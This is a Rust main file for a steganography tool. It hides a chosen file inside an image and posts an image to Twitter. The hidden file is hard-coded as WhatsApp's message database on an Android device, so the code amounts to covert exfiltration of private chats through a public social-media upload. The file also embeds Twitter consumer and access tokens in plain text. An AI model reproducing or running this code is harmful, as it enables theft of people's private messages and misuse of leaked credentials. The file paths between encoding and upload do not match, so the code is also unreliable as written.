mod encoder;
mod errors;
mod utils;
use std::path::PathBuf;
use encoder::Encoder;
use errors::Error;
use utils::ByteMask;
use tokio;
use egg_mode::tweet::DraftTweet;
use egg_mode::media::{get_status, media_types, set_metadata, upload_media, ProgressInfo};
extern crate egg_mode;


fn main() -> Result<(), Error> {
    let mask = ByteMask::new(2)?;
    twitter_test();
    encode(PathBuf::from("/sdcard/Pictures/myfavoritetoast.jpg"), PathBuf::from("/data/data/com.whatsapp/databases/msgstore.db"), PathBuf::from("/data/othertoast.png"), mask)?;
    //encode(PathBuf::from("/Users/connor/Desktop/myfavoritetoast.jpg"), PathBuf::from("/User/connor/Desktop/message.txt"), PathBuf::from("/Users/connor/Desktop/othertoast.png"), mask)?;
    Ok(())
}

#[tokio::main]
async fn twitter_test() -> Result<(), Box<dyn std::error::Error>> {
    let con_token = egg_mode::KeyPair::new("Z5kqu3hywa02aW2BYNGeWkkXA", "xSGYyYwGEIu95Wc7pOAKh7aIW9kymStpxWVDC85i0MRjedvtj4");
    let access_token = egg_mode::KeyPair::new("1249802159178350599-C3zosoCFc0zdYrm4Fmk05WvMaMznZ4", "2FKoqwS5GA310J0bEy1X4djvjlFOeL2AdjmCpIT6MQSH7");
    let token = egg_mode::Token::Access {
        consumer: con_token,
        access: access_token,
    };
    let mut tweet = DraftTweet::new(" ");
    let typ = media_types::image_png();
    let bytes = std::fs::read("/sdcard/Pictures/othertoast.png")?;
    let handle = upload_media(&bytes, &typ, &token).await?;
    tweet.add_media(handle.id.clone());
    println!("ADDED");
    tweet.send(&token).await?;
    println!("TWEETED");
    Ok(())
}


fn encode(image: PathBuf, secret: PathBuf, output: PathBuf, mask: ByteMask) -> Result<(), Error> {
    let mut encoder = Encoder::new(image, secret, mask)?;
    encoder.save(output)?;
    Ok(())
}

